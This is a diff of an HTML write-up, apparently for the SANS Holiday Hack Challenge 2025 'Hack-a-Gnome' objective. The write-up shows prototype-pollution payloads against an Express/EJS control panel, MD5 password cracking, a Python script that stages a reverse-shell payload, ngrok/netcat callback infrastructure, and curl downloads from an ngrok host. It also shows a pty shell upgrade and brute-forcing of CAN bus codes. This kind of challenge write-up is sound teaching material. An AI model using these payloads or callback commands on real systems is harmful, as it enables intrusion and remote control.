@@ -40,29 +40,29 @@ I love single player video games with great stoylines.
 Hey, I could really use another set of eyes on this gnome takeover situation.">
     <meta itemprop="datePublished" content="2025-11-30T11:47:39+01:00">
     <meta itemprop="dateModified" content="2025-11-30T11:47:39+01:00">
-    <meta itemprop="wordCount" content="2844">
+    <meta itemprop="wordCount" content="2925">
     <title>Hack-a-Gnome :: SANS Holiday Hack Challenge 2025</title>
     <link href="/act3/hack-a-gnome/index.xml" rel="alternate" type="application/rss+xml" title="Hack-a-Gnome :: SANS Holiday Hack Challenge 2025">
-    <link href="/css/auto-complete/auto-complete.min.css?1765549738" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1765549738" defer></script>
-    <script src="/js/search-lunr.js?1765549738" defer></script>
-    <script src="/js/search.js?1765549738" defer></script>
+    <link href="/css/auto-complete/auto-complete.min.css?1765551208" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1765551208" defer></script>
+    <script src="/js/search-lunr.js?1765551208" defer></script>
+    <script src="/js/search.js?1765551208" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1765549738";
+      window.relearn.index_js_url="/searchindex.en.js?1765551208";
     </script>
-    <script src="/js/lunr/lunr.min.js?1765549738" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1765549738" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1765549738" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1765549738" defer></script>
+    <script src="/js/lunr/lunr.min.js?1765551208" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1765551208" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1765551208" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1765551208" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765549738" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765549738" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765549738" rel="stylesheet">
-    <link href="/css/theme.css?1765549738" rel="stylesheet">
-    <link href="/css/format-html.css?1765549738" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551208" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/fontawesome-all.min.css?1765551208" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1765551208" rel="stylesheet">
+    <link href="/css/theme.css?1765551208" rel="stylesheet">
+    <link href="/css/format-html.css?1765551208" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -139,14 +139,6 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
       <ul>
         <li><a href="#getting-access-to-the-control-panel">Getting access to the control panel</a></li>
         <li><a href="#exploiting-the-control-panel">Exploiting the control panel</a></li>
-      </ul>
-    </li>
-    <li><a href="#solution-1">Solution</a>
-      <ul>
-        <li><a href="#web-application">Web application</a></li>
-        <li><a href="#identifying-control-codes">Identifying control codes</a></li>
-        <li><a href="#robot">Robot</a></li>
-        <li><a href="#web-application-1">Web application</a></li>
         <li><a href="#operating-the-reverse-shell">Operating the reverse shell</a></li>
         <li><a href="#enumerating-control-codes">Enumerating control codes</a></li>
       </ul>
@@ -193,8 +185,8 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 
 <h1 id="hack-a-gnome">Hack-a-Gnome</h1>
 
-<p><a href="#R-image-4852bf0bc57973d2fd90fcbdec522a6d" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-4852bf0bc57973d2fd90fcbdec522a6d"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
+<p><a href="#R-image-eb0de369718ac2b7f005f7b53764c4ba" class="lightbox-link"><img alt="Chris Daves" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-eb0de369718ac2b7f005f7b53764c4ba"><img alt="Chris Daves" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/chrisdavis-avatar.gif"></a></p>
 <h2 id="objective">Objective</h2>
 <table>
   <thead>
@@ -227,8 +219,8 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 <h2 id="solution">Solution</h2>
 <h3 id="getting-access-to-the-control-panel">Getting access to the control panel</h3>
 <p>When opening the URL <a href="https://hhc25-smartgnomehack-prod.holidayhackchallenge.com" rel="external">https://hhc25-smartgnomehack-prod.holidayhackchallenge.com</a> we are presented with the following landing page:</p>
-<p><a href="#R-image-8c660f9bfa722f00bfc1cf285a1b79c0" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-8c660f9bfa722f00bfc1cf285a1b79c0"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
+<p><a href="#R-image-dd85b9186a089c656b89332fd4e37539" class="lightbox-link"><img alt="First landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-dd85b9186a089c656b89332fd4e37539"><img alt="First landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-6.png"></a></p>
 <p>By inspecting the HTML source of the mainpage we found an interesting Javascript file, <code>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js</code>. By reading it we got to know a few interesting endpoints:</p>
 <table>
   <thead>
@@ -392,8 +384,8 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
 <p>The digest (passwords) were stored as MD5 - by simply visiting <a href="https://crackstation.net" rel="external">Crackstation</a> we decoded them easily</p>
 <h3 id="exploiting-the-control-panel">Exploiting the control panel</h3>
 <p>Upon logging in to the control panel we are presented with this landingpage:</p>
-<p><a href="#R-image-41ad29ff0224e4638f0207bbda9da23c" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-41ad29ff0224e4638f0207bbda9da23c"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
+<p><a href="#R-image-8e8ddcdcff818055923615855cae9e4e" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-8e8ddcdcff818055923615855cae9e4e"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-1.png"></a></p>
 <p>From inspecting the HTML source code and Javascript code we find the following endpoints:</p>
 <table>
   <thead>
@@ -426,11 +418,10 @@ Hey, I could really use another set of eyes on this gnome takeover situation.">
   </tbody>
 </table>
 <h4 id="finding-exploitable-vector">Finding exploitable vector</h4>
-<p>From the endpoints we see that there is just one endpoint taking any form of input, <em>/ctrlsignals</em>. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill.</p>
-<h5 id="uncovering-the-template-rendering-engine">Uncovering the template rendering engine</h5>
-<p>By sending a single <code>'</code> we can make the system fail at parsing the input:</p>
+<p>From the endpoints we see that there is just one endpoint taking any form of input, <em>/ctrlsignals</em>. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. So lets toy some further.</p>
+<p>By sending a single <em>&rsquo;</em> we can make the system fail at parsing the input:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>SyntaxError: Unexpected token &#39; in JSON at position 0    at JSON.parse (&lt;anonymous&gt;)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9</code></pre></div>
-<p>Provoking error message to confirm <code>__proto__</code> vulnerability in EJS templating system;</p>
+<p>Provoking error message to confirm <em>__proto__</em> vulnerability in EJS templating system;</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-BASH" data-lang="BASH"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;action&#34;</span>:<span style="color:#e6db74">&#34;update&#34;</span>,<span style="color:#e6db74">&#34;key&#34;</span>:<span style="color:#e6db74">&#34;__proto__&#34;</span>,<span style="color:#e6db74">&#34;subkey&#34;</span>:<span style="color:#e6db74">&#34;toString&#34;</span>,<span style="color:#e6db74">&#34;value&#34;</span>:<span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div>
 <p>This had to be sent as URL-encoded value:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message<span style="color:#f92672">=</span>%7B%22action%22:%22update%22,%22key%22:%22__proto__%22,%22subkey%22:%22toString%22,%22value%22:%22a%22%7D</span></span></code></pre></div>
@@ -473,49 +464,15 @@ escapeFn is not a function
     at tryRender (/app/node_modules/express/lib/application.js:657:10)
     at Function.render (/app/node_modules/express/lib/application.js:609:3)
     at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)</code></pre></div>
-<p>Endpoint has an error that gives away an flaw in Json.parse</p>
-<div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">title</span>&gt;Error&lt;/<span style="color:#f92672">title</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">pre</span>&gt;SyntaxError: Unexpected token _ in JSON at position 0&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at JSON.parse (&amp;lt;anonymous&amp;gt;)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at /app/server.js:121:33&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at next (/app/node_modules/express/lib/router/route.js:149:13)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at /app/node_modules/express/lib/router/index.js:284:15&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at next (/app/node_modules/express/lib/router/index.js:280:10)&lt;<span style="color:#f92672">br</span>&gt; &amp;nbsp; &amp;nbsp;at /app/server.js:49:9&lt;/<span style="color:#f92672">pre</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;</span></span></code></pre></div>
-<p>python3 -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
-<p>Remember to refresh the main page for the reverse shell to work!!!</p>
-<p>NOTE: SOLVE THIS USING EDGE!!!!</p>
-<p>curl -o test.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh</a>
-curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</a></p>
-<p>General workflow from start to finish:</p>
+<h4 id="web-application">Web application</h4>
+<p>In order to craft a payload we turned to Python for development, as fiddling with the browser quickly became cumbersome. The following Python script is provided as is. It functions as thus:</p>
 <ol>
-<li>In the webapp, inspect all endpoint</li>
-<li>Find the endpoint where you can set data</li>
-<li>Provoke error messages to find the rendering engine (EJS)</li>
-<li>See if it is possible to set <strong>proto</strong></li>
+<li>Login to the control panel</li>
+<li>Trigger JSON parse error</li>
+<li>Stages the payload. In this (final) version it pollutes __proto__ with a piece of code that connects back to our reverse shell</li>
+<li>Triggers the reverse shell by visiting the /stats endpoint</li>
 </ol>
-<p>Enabling shell
-5. On endpoint set client = 1
-6. On endpoint set debug = 1
-7. Set up NGROK netcat reverse
-8. Plant payload for reverse shell using the NGROK address and port
-9. Refresh main page</p>
-<p>In spawned shell:
-10. Privilege escalate using python to get a fancy bash shell
-11. Inspect canbus_client.py
-12. Inspect README.md</p>
-<p>Identifying missing HEX code
-13. Set up NGROK web frontend
-14. Spin up Python webserver
-15. Serve HEX bruteforce python script
-16. Run bruteforce script whilst observing if the robot moves</p>
-<h2 id="solution-1">Solution</h2>
-<h3 id="web-application">Web application</h3>
-<h3 id="identifying-control-codes">Identifying control codes</h3>
-<h3 id="robot">Robot</h3>
-<h3 id="web-application-1">Web application</h3>
+<p>We found this to be a functional and fairly quick methodology to tackle the objective. The code:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> html
@@ -601,7 +558,7 @@ curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
 </span></span><span style="display:flex;"><span>stats_panel_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats&#34;</span>
 </span></span><span style="display:flex;"><span>stats_r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(stats_panel_url)
 </span></span><span style="display:flex;"><span>print(stats_r<span style="color:#f92672">.</span>text)</span></span></code></pre></div>
-<p>Output:</p>
+<p>We made the script output the URLs so we could copy them and paste them into our web browser to bring the reverse shell into our logged in session to steer the robot.</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>===========================================
 Step 1. Provoke Error message
 ===========================================
@@ -634,6 +591,7 @@ Step 4. Stats page
 ===========================================
 
 ... snip ...</code></pre></div>
+<p>In the initial development phase of our payload we made it reach out to a webhook on the Internett, just to verify it working. Once that was done we simply changed over to using an Ngrok infrastucture with netcat shell.</p>
 <h4 id="setup-attack-infrastructure">Setup attack infrastructure</h4>
 <p>In order to conduct this attack we had to set up the following infrastructure using Kali in WSL (in total four instances):</p>
 <table>
@@ -689,14 +647,14 @@ flowchart LR
     TCP &lt;--TCP/8501--&gt; netcat[&#34;Netcat listener&#34;]</pre>
 <h3 id="operating-the-reverse-shell">Operating the reverse shell</h3>
 <p>With our payload in order it quickly called back through our infrastructe and we got shell. We immediatly started to snoop around:</p>
-<p><a href="#R-image-6a988d48374c735eb73827dd8bee30ea" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-6a988d48374c735eb73827dd8bee30ea"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
+<p><a href="#R-image-2e0946ca08017e8d70b532754ef3f477" class="lightbox-link"><img alt="Call back" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-2e0946ca08017e8d70b532754ef3f477"><img alt="Call back" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-2.png"></a></p>
 <p>The <code>canbus_client.py</code> caught our eye:</p>
-<p><a href="#R-image-f5c2b7b317e32957d4449eac0405e0bd" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-f5c2b7b317e32957d4449eac0405e0bd"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
+<p><a href="#R-image-adb189fad9a41ac46a4942343f5c9734" class="lightbox-link"><img alt="Canbus client" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-adb189fad9a41ac46a4942343f5c9734"><img alt="Canbus client" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-3.png"></a></p>
 <p>Turns out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes we recognized from the error messages for the bot in the Gnome Control Center. All of these codes leads to errors and no wonder because the comment in code mentions they are wrong. We then turned our attention to the <em>README.md</em> file:</p>
-<p><a href="#R-image-4a36a97437fb516ac7a931f9adb98c58" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-4a36a97437fb516ac7a931f9adb98c58"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
+<p><a href="#R-image-0c8545a3b6022e71325d12c54904d6fb" class="lightbox-link"><img alt="Landing page" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-0c8545a3b6022e71325d12c54904d6fb"><img alt="Landing page" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-4.png"></a></p>
 <p>A whole lot of text, but only the very last part is of interest. It basically state the codes to move the robot is unknown at the moment. So we were left alone to figure these out.</p>
 <h3 id="enumerating-control-codes">Enumerating control codes</h3>
 <p>In order to find the correct control codes we took basis in the Python script on the server, uploaded it to ChatGPT and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command:</p>
@@ -836,8 +794,8 @@ flowchart LR
 <p>We grabbed the Python script from the server to our attacking machine, edited it according to the mapping and reuploaded it under a new name (<em>cb.py</em>). This enabled us to navigate our robot through the maze using this command and directions:</p>
 <div class="highlight wrap-code" dir="auto"><pre tabindex="0"><code>python3 cb.py &lt;direction&gt;</code></pre></div>
 <p>Leading us to solving the objective:</p>
-<p><a href="#R-image-c2e10b3499d19754d3da7227467d4861" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-c2e10b3499d19754d3da7227467d4861"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
+<p><a href="#R-image-21c8efb368f7edd5d752179bbec5f72d" class="lightbox-link"><img alt="Final screen" class="lazy lightbox figure-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-21c8efb368f7edd5d752179bbec5f72d"><img alt="Final screen" class="lazy lightbox lightbox-image" loading="lazy" src="/images/act3/act3-hackagnome-5.png"></a></p>
 <h2 id="resources">Resources</h2>
 <p>This objective required extensive reading up on the whole <code>__proto__</code> attack vector. We found these resources of great value for our research:</p>
 <ul>
@@ -883,6 +841,33 @@ flowchart LR
       </tr>
   </tbody>
 </table>
+<p>python3 -c &lsquo;import pty;pty.spawn(&quot;/bin/bash&quot;)&rsquo;</p>
+<p>Remember to refresh the main page for the reverse shell to work!!!</p>
+<p>NOTE: SOLVE THIS USING EDGE!!!!</p>
+<p>curl -o test.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh</a>
+curl -o cb.py  <a href="https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py" rel="external">https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py</a></p>
+<p>General workflow from start to finish:</p>
+<ol>
+<li>In the webapp, inspect all endpoint</li>
+<li>Find the endpoint where you can set data</li>
+<li>Provoke error messages to find the rendering engine (EJS)</li>
+<li>See if it is possible to set <strong>proto</strong></li>
+</ol>
+<p>Enabling shell
+5. On endpoint set client = 1
+6. On endpoint set debug = 1
+7. Set up NGROK netcat reverse
+8. Plant payload for reverse shell using the NGROK address and port
+9. Refresh main page</p>
+<p>In spawned shell:
+10. Privilege escalate using python to get a fancy bash shell
+11. Inspect canbus_client.py
+12. Inspect README.md</p>
+<p>Identifying missing HEX code
+13. Set up NGROK web frontend
+14. Spin up Python webserver
+15. Serve HEX bruteforce python script
+16. Run bruteforce script whilst observing if the robot moves</p>
 
   <footer class="footline">
               <i class='fa-fw fas fa-calendar'></i> Nov 30, 2025
@@ -958,22 +943,22 @@ flowchart LR
 <div id="R-footer"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/js-yaml/js-yaml.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-color.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1765549738" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1765549738" defer></script>
-    <script src="/js/mermaid/mermaid.min.js?1765549738" defer></script>
+    <script src="/js/js-yaml/js-yaml.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-color.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1765551208" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1765551208" defer></script>
+    <script src="/js/mermaid/mermaid.min.js?1765551208" defer></script>
     <script>
       window.relearn.themeUseMermaid = JSON.parse("{}");
     </script>
-    <script src="/js/clipboard/clipboard.min.js?1765549738" defer></script>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765549738" defer></script>
-    <script src="/js/theme.js?1765549738" defer></script>
+    <script src="/js/clipboard/clipboard.min.js?1765551208" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1765551208" defer></script>
+    <script src="/js/theme.js?1765551208" defer></script>
   </body>
 </html>
